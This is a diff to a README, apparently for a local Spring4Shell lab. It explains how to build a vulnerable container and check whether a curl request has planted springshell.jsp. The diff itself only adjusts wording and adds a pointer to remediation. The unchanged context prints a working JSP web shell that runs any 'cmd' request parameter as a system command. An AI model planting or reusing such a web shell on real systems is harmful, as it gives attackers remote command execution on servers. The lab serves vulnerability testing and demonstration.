@@ -29,7 +29,7 @@ curl --request POST \
 3. Review jsp content:
    `docker exec -it springshell bash -c "cd webapps/ROOT;cat springshell.jsp"` will display
    `<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//`
-   _This means the application is compromised_
+   _This means the application is compromised_. Refer remediation steps in the references below
 
 ### spring-boot jar
 1. Run command to:
@@ -38,7 +38,6 @@ curl --request POST \
     - Create a container from the image        
       `mvn clean package && docker build . -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
 2. Run curl command that attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
-    1. If the jsp is not created, _the application is not compromised_
 ```
 curl --request POST \
   --url http://localhost:8080/zeroday \
